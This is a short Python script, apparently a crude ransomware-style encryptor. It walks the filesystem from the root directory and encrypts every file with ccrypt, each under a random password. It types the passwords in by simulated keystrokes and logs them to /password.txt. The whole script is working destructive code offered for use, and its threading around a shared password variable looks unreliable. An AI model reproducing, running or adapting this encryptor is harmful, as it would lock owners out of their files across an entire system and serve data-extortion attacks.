import os
import pyautogui as p
import time
import string
import random
import threading
from rich.console import Console
from rich.style import Style
console = Console()

base_style = Style.parse("red")
file_style = Style.parse('dark_slate_gray2')


os.system('clear')

# path to crypt
crypt_path = '/'       #Specified Path!!
cp = crypt_path

def multpy():
    threading.Thread(target=cy).start()
    time.sleep(0.2)
    threading.Thread(target=insert).start()

#crypt
def insert():
        p.write(password)
        p.press('enter')
        p.write(password)
        p.press('enter')
        with open(f'{cp}/password.txt','a') as pwdfile:                                      # SAFE PASSWORD IN '/'
            pwdfile.write('File Name: '+  file + '\nPassword File: ' +password+'\n\n')
def cy():
  os.system('ccrypt -e ' + path_attack)


try:
    for (path,dirs,files) in os.walk(crypt_path,topdown=True):
        for file in files:
            if file != 'password.txt':
                #os.system('clear')

                lib = string.ascii_letters + string.digits + string.punctuation     # Generate Password
                length = 30
                password = "".join(random.sample(lib,length))
                
                path_attack = path + '/' + file
                multpy()
                console.print(f'Done File: ',style = base_style)   # Execute File
                console.print(f"{file}", style= file_style)
                print()                                                            # Start crypting process
                time.sleep(0.5)
                os.system('clear')
except:
    print("Don't work")
